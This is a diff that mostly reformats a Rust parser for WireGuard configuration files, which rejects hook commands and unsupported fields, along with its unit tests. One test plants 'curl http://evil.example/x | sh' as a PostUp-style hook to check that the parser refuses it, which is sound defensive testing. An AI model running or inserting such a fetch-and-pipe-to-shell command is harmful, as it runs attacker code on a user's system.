@@ -80,7 +80,10 @@ fn bad(line: usize, msg: impl std::fmt::Display) -> Error {
 fn key32(line: usize, what: &str, v: &str) -> Result<()> {
     match base64::decode(v) {
         Some(b) if b.len() == 32 && v.len() == 44 => Ok(()),
-        _ => Err(bad(line, format!("{what} is not a WireGuard key (44 characters of base64 encoding 32 bytes)"))),
+        _ => Err(bad(
+            line,
+            format!("{what} is not a WireGuard key (44 characters of base64 encoding 32 bytes)"),
+        )),
     }
 }
 
@@ -88,7 +91,8 @@ fn number<T: std::str::FromStr>(line: usize, what: &str, v: &str) -> Result<T> {
     if v.is_empty() || !v.bytes().all(|b| b.is_ascii_digit()) {
         return Err(bad(line, format!("{what} must be a number")));
     }
-    v.parse().map_err(|_| bad(line, format!("{what} is out of range")))
+    v.parse()
+        .map_err(|_| bad(line, format!("{what} is out of range")))
 }
 
 fn hostname_ok(h: &str) -> bool {
@@ -118,7 +122,9 @@ fn parse_endpoint(line: usize, v: &str) -> Result<Endpoint> {
         }
         return Ok(Endpoint::Ip(a));
     }
-    let (host, port) = v.rsplit_once(':').ok_or_else(|| bad(line, "Endpoint must be host:port or [ipv6]:port"))?;
+    let (host, port) = v
+        .rsplit_once(':')
+        .ok_or_else(|| bad(line, "Endpoint must be host:port or [ipv6]:port"))?;
     if host.starts_with('[') || host.contains(':') {
         return Err(bad(line, "an IPv6 Endpoint must be written [address]:port"));
     }
@@ -127,9 +133,15 @@ fn parse_endpoint(line: usize, v: &str) -> Result<Endpoint> {
         return Err(bad(line, "Endpoint port must not be 0"));
     }
     if !hostname_ok(host) {
-        return Err(bad(line, format!("Endpoint host {host:?} is not a valid host name")));
+        return Err(bad(
+            line,
+            format!("Endpoint host {host:?} is not a valid host name"),
+        ));
     }
-    Ok(Endpoint::Host { host: host.to_ascii_lowercase(), port })
+    Ok(Endpoint::Host {
+        host: host.to_ascii_lowercase(),
+        port,
+    })
 }
 
 const HOOKS: &[&str] = &["preup", "postup", "predown", "postdown"];
@@ -137,7 +149,9 @@ const HOOKS: &[&str] = &["preup", "postup", "predown", "postdown"];
 /// Parse and validate a configuration.
 pub fn parse(text: &str) -> Result<WgConfig> {
     if text.len() > MAX_FILE {
-        return Err(Error::invalid(format!("WireGuard file is larger than {MAX_FILE} bytes")));
+        return Err(Error::invalid(format!(
+            "WireGuard file is larger than {MAX_FILE} bytes"
+        )));
     }
     let text = text.strip_prefix('\u{feff}').unwrap_or(text);
 
@@ -167,12 +181,19 @@ pub fn parse(text: &str) -> Result<WgConfig> {
             continue;
         }
         if let Some(rest) = line.strip_prefix('[') {
-            let name = rest.strip_suffix(']').ok_or_else(|| bad(n, "unterminated section header"))?.trim().to_ascii_lowercase();
+            let name = rest
+                .strip_suffix(']')
+                .ok_or_else(|| bad(n, "unterminated section header"))?
+                .trim()
+                .to_ascii_lowercase();
             section = match name.as_str() {
                 "interface" => {
                     n_iface += 1;
                     if n_iface > 1 {
-                        return Err(bad(n, "a second [Interface] section: a file describes one interface"));
+                        return Err(bad(
+                            n,
+                            "a second [Interface] section: a file describes one interface",
+                        ));
                     }
                     Section::Interface
                 }
@@ -187,14 +208,18 @@ pub fn parse(text: &str) -> Result<WgConfig> {
             };
             continue;
         }
-        let (key, value) = line.split_once('=').ok_or_else(|| bad(n, "expected Key = Value"))?;
+        let (key, value) = line
+            .split_once('=')
+            .ok_or_else(|| bad(n, "expected Key = Value"))?;
         let key = key.trim().to_ascii_lowercase();
         let value = value.trim();
         if value.is_empty() {
             return Err(bad(n, format!("{} has no value", key)));
         }
         match (section, key.as_str()) {
-            (Section::None, _) => return Err(bad(n, "a setting before any [Interface] or [Peer] section")),
+            (Section::None, _) => {
+                return Err(bad(n, "a setting before any [Interface] or [Peer] section"))
+            }
 
             (Section::Interface, k) if HOOKS.contains(&k) => {
                 return Err(bad(
@@ -235,9 +260,23 @@ pub fn parse(text: &str) -> Result<WgConfig> {
                 listen_port = Some(p);
             }
             (Section::Interface, "table" | "fwmark" | "saveconfig") => {
-                return Err(bad(n, format!("{} is not supported: the manager owns routing and marks", key)));
+                return Err(bad(
+                    n,
+                    format!(
+                        "{} is not supported: the manager owns routing and marks",
+                        key
+                    ),
+                ));
             }
-            (Section::Interface, _) => return Err(bad(n, format!("unknown [Interface] field {:?}", line.split('=').next().unwrap_or("").trim()))),
+            (Section::Interface, _) => {
+                return Err(bad(
+                    n,
+                    format!(
+                        "unknown [Interface] field {:?}",
+                        line.split('=').next().unwrap_or("").trim()
+                    ),
+                ))
+            }
 
             (Section::Peer, "publickey") => {
                 if public_key.is_some() {
@@ -267,27 +306,40 @@ pub fn parse(text: &str) -> Result<WgConfig> {
             (Section::Peer, "persistentkeepalive") => {
                 keepalive = Some(number(n, "PersistentKeepalive", value)?);
             }
-            (Section::Peer, _) => return Err(bad(n, format!("unknown [Peer] field {:?}", line.split('=').next().unwrap_or("").trim()))),
+            (Section::Peer, _) => {
+                return Err(bad(
+                    n,
+                    format!(
+                        "unknown [Peer] field {:?}",
+                        line.split('=').next().unwrap_or("").trim()
+                    ),
+                ))
+            }
         }
     }
 
     if n_iface != 1 {
-        return Err(Error::invalid(format!("WireGuard file must have exactly one [Interface] section, found {n_iface}")));
+        return Err(Error::invalid(format!(
+            "WireGuard file must have exactly one [Interface] section, found {n_iface}"
+        )));
     }
     if n_peer != 1 {
         return Err(Error::invalid(format!(
             "WireGuard file must have exactly one [Peer] section, found {n_peer}: a network group leaves through one exit"
         )));
     }
-    let (_, private_key) = private_key.ok_or_else(|| Error::invalid("WireGuard file has no PrivateKey"))?;
+    let (_, private_key) =
+        private_key.ok_or_else(|| Error::invalid("WireGuard file has no PrivateKey"))?;
     if addresses.is_empty() {
         return Err(Error::invalid("WireGuard file has no Address"));
     }
-    let public_key = public_key.ok_or_else(|| Error::invalid("WireGuard file has no [Peer] PublicKey"))?;
+    let public_key =
+        public_key.ok_or_else(|| Error::invalid("WireGuard file has no [Peer] PublicKey"))?;
     if allowed.is_empty() {
         return Err(Error::invalid("WireGuard file has no [Peer] AllowedIPs"));
     }
-    let endpoint = endpoint.ok_or_else(|| Error::invalid("WireGuard file has no [Peer] Endpoint"))?;
+    let endpoint =
+        endpoint.ok_or_else(|| Error::invalid("WireGuard file has no [Peer] Endpoint"))?;
 
     if !allowed.iter().any(IpNet::is_default_v4) {
         return Err(Error::invalid(
@@ -318,7 +370,8 @@ impl WgConfig {
     /// Whether the tunnel can carry IPv6: an IPv6 interface address and a
     /// `::/0` route. The group's policy blocks IPv6 otherwise.
     pub fn carries_ipv6(&self) -> bool {
-        self.addresses.iter().any(IpNet::is_v6) && self.peer.allowed_ips.iter().any(IpNet::is_default_v6)
+        self.addresses.iter().any(IpNet::is_v6)
+            && self.peer.allowed_ips.iter().any(IpNet::is_default_v6)
     }
 
     /// The text `wg setconf` reads, with the endpoint already resolved to an
@@ -336,7 +389,12 @@ impl WgConfig {
         if let Some(k) = &self.peer.preshared_key {
             s.push_str(&format!("PresharedKey = {}\n", k.expose()));
         }
-        let ips: Vec<String> = self.peer.allowed_ips.iter().map(|n| n.to_string()).collect();
+        let ips: Vec<String> = self
+            .peer
+            .allowed_ips
+            .iter()
+            .map(|n| n.to_string())
+            .collect();
         s.push_str(&format!("AllowedIPs = {}\n", ips.join(", ")));
         s.push_str(&format!("Endpoint = {endpoint}\n"));
         if let Some(k) = self.peer.persistent_keepalive {
@@ -354,7 +412,9 @@ impl WgConfig {
 /// Curve25519 public key for a WireGuard private key, both in WireGuard's
 /// base64 form.
 pub fn derive_public(private_b64: &str) -> Result<String> {
-    let raw = base64::decode(private_b64).filter(|b| b.len() == 32).ok_or_else(|| Error::invalid("not a WireGuard private key"))?;
+    let raw = base64::decode(private_b64)
+        .filter(|b| b.len() == 32)
+        .ok_or_else(|| Error::invalid("not a WireGuard private key"))?;
     let mut bytes = [0u8; 32];
     bytes.copy_from_slice(&raw);
     let secret = x25519_dalek::StaticSecret::from(bytes);
@@ -385,19 +445,37 @@ mod tests {
         assert_eq!(c.addresses.len(), 2);
         assert_eq!(c.dns, vec!["10.66.0.1".parse::<IpAddr>().unwrap()]);
         assert_eq!(c.mtu, Some(1380));
-        assert_eq!(c.peer.endpoint, Endpoint::Host { host: "gw.example.org".into(), port: 51820 });
+        assert_eq!(
+            c.peer.endpoint,
+            Endpoint::Host {
+                host: "gw.example.org".into(),
+                port: 51820
+            }
+        );
         assert_eq!(c.peer.persistent_keepalive, Some(25));
         assert!(c.carries_ipv6());
         let conf = c.render_setconf("203.0.113.9:51820".parse().unwrap());
         let t = conf.expose();
         assert!(t.contains("Endpoint = 203.0.113.9:51820"));
-        assert!(!t.contains("Address") && !t.contains("DNS") && !t.contains("MTU"), "wg-quick-only fields must not reach wg setconf:\n{t}");
+        assert!(
+            !t.contains("Address") && !t.contains("DNS") && !t.contains("MTU"),
+            "wg-quick-only fields must not reach wg setconf:\n{t}"
+        );
     }
 
     #[test]
     fn every_hook_is_refused_whatever_its_spelling() {
-        for hook in ["PostUp", "postup", "PRE-UP".replace('-', "").as_str(), "PreDown", "PostDown"] {
-            let f = sample().replace("MTU = 1380", &format!("{hook} = curl http://evil.example/x | sh"));
+        for hook in [
+            "PostUp",
+            "postup",
+            "PRE-UP".replace('-', "").as_str(),
+            "PreDown",
+            "PostDown",
+        ] {
+            let f = sample().replace(
+                "MTU = 1380",
+                &format!("{hook} = curl http://evil.example/x | sh"),
+            );
             let e = parse(&f).unwrap_err().to_string();
             assert!(e.contains("never run"), "{hook}: {e}");
         }
@@ -405,7 +483,12 @@ mod tests {
 
     #[test]
     fn unknown_and_unsupported_fields_are_errors_not_silently_dropped() {
-        for extra in ["Table = off", "FwMark = 51820", "SaveConfig = true", "Foo = bar"] {
+        for extra in [
+            "Table = off",
+            "FwMark = 51820",
+            "SaveConfig = true",
+            "Foo = bar",
+        ] {
             let f = sample().replace("MTU = 1380", extra);
             assert!(parse(&f).is_err(), "{extra}");
         }
@@ -415,8 +498,19 @@ mod tests {
 
     #[test]
     fn one_peer_exactly() {
-        let two = format!("{}\n[Peer]\nPublicKey = {}\nAllowedIPs = 10.0.0.0/8\n", sample(), key(9));
-        assert!(parse(&two).unwrap_err().to_string().contains("exactly one [Peer]"), "{}", parse(&two).unwrap_err());
+        let two = format!(
+            "{}\n[Peer]\nPublicKey = {}\nAllowedIPs = 10.0.0.0/8\n",
+            sample(),
+            key(9)
+        );
+        assert!(
+            parse(&two)
+                .unwrap_err()
+                .to_string()
+                .contains("exactly one [Peer]"),
+            "{}",
+            parse(&two).unwrap_err()
+        );
         let none = sample().split("[Peer]").next().unwrap().to_string();
         assert!(parse(&none).is_err());
     }
@@ -429,10 +523,15 @@ mod tests {
 
     #[test]
     fn an_ipv4_only_tunnel_does_not_carry_ipv6() {
-        let f = sample().replace("0.0.0.0/0, ::/0", "0.0.0.0/0").replace(", fd66:1::2/128", "");
+        let f = sample()
+            .replace("0.0.0.0/0, ::/0", "0.0.0.0/0")
+            .replace(", fd66:1::2/128", "");
         assert!(!parse(&f).unwrap().carries_ipv6());
         let f = sample().replace("0.0.0.0/0, ::/0", "0.0.0.0/0");
-        assert!(!parse(&f).unwrap().carries_ipv6(), "an ::/0 route is also needed");
+        assert!(
+            !parse(&f).unwrap().carries_ipv6(),
+            "an ::/0 route is also needed"
+        );
     }
 
     #[test]
@@ -441,7 +540,10 @@ mod tests {
             ("MTU = 1380", "MTU = 12"),
             ("MTU = 1380", "MTU = lots"),
             ("DNS = 10.66.0.1", "DNS = dns.example.org"),
-            ("Address = 10.66.1.2/32, fd66:1::2/128", "Address = 10.66.1.2/33"),
+            (
+                "Address = 10.66.1.2/32, fd66:1::2/128",
+                "Address = 10.66.1.2/33",
+            ),
             ("gw.example.org:51820", "gw.example.org"),
             ("gw.example.org:51820", "gw.example.org:0"),
             ("gw.example.org:51820", "999.1.1.1:51820"),
@@ -492,6 +594,9 @@ mod tests {
     }
 
     fn hex(s: &str) -> Vec<u8> {
-        (0..s.len()).step_by(2).map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap()).collect()
+        (0..s.len())
+            .step_by(2)
+            .map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap())
+            .collect()
     }
 }
